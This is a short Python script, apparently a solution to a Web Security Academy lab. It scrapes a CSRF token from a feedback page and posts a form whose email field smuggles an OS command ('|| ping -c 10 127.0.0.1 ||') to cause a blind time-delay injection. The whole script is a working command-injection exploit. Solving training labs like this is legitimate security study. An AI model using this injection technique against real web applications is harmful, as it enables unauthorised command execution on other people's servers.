import requests
from bs4 import BeautifulSoup

site = 'acf71f8e1f422a77803a6b4d00e90047.web-security-academy.net'

s = requests.Session()
feedback_url = f'https://{site}/feedback'
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

feedback_submit_url = f'https://{site}/feedback/submit'
post_data = {
    'csrf' : csrf,
    'name' : 'Rick Astley',
    'email' : 'rick@gmail.com || ping -c 10 127.0.0.1 ||',
    'subject' : 'nevergiveyouup',
    'message' : 'baby'
}
resp = s.post(feedback_submit_url, data=post_data)
print(resp.text)